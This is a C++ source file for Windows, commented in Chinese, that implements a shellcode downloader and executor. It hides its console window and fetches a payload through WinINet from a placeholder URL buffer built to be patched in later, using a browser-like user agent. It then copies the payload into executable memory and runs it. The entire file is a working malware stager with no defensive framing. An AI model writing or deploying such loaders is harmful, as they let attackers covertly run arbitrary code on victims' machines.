#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment (lib, "Wininet.lib")

struct Shellcode {
    byte* data;
    DWORD len;
};

Shellcode Download(LPCWSTR url);
void Execute(Shellcode shellcode);

// 去除末尾空格
void TrimTrailingSpaces(LPWSTR str) {
    int len = wcslen(str);
    while (len > 0 && iswspace(str[len - 1])) {
        str[--len] = L'\0';
    }
}

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // 隐藏控制台窗口

    // 定义 URL（示例）
    wchar_t url[] = L"URLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    TrimTrailingSpaces(url); // 去掉末尾空格

    Shellcode shellcode = Download(url);
    Execute(shellcode);

    return 0;
}

Shellcode Download(LPCWSTR url) {
    HINTERNET session = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);

    HINTERNET request = InternetOpenUrlW(
        session,
        url,
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0);

    if (!request) {
        exit(0); // 打开 URL 失败
    }

    DWORD bufSize = BUFSIZ;
    byte* buffer = new byte[bufSize];

    DWORD capacity = bufSize;
    byte* payload = (byte*)malloc(capacity);

    DWORD payloadSize = 0;

    while (true) {
        DWORD bytesRead;

        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            exit(0); // 读取失败
        }

        if (bytesRead == 0) break;

        if (payloadSize + bytesRead > capacity) {
            capacity *= 2;
            byte* newPayload = (byte*)realloc(payload, capacity);
            payload = newPayload;
        }

        memcpy(payload + payloadSize, buffer, bytesRead);
        payloadSize += bytesRead;
    }

    byte* newPayload = (byte*)realloc(payload, payloadSize);

    InternetCloseHandle(request);
    InternetCloseHandle(session);

    struct Shellcode out;
    out.data = newPayload;
    out.len = payloadSize;
    return out;
}

void Execute(Shellcode shellcode) {
    void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode.data, shellcode.len);
    ((void(*)())exec)();
}
